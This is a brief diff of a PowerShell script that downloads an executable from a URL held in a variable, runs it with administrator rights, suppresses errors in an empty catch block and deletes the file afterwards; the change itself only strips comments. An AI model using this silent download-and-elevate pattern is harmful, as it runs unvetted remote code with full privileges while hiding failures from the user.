@@ -8,19 +8,15 @@ function Clean-Up {
 }
 
 try {
-    # Set TLS for older Windows versions
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    
-    # Download file
     Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop
 
-    # Run as Admin and Wait
     if (Test-Path $tempPath) {
         Start-Process -FilePath $tempPath -Verb RunAs -Wait
     }
 }
 catch {
-    # No Thai characters to prevent encoding errors
+    # Error occurred
 }
 finally {
     Clean-Up
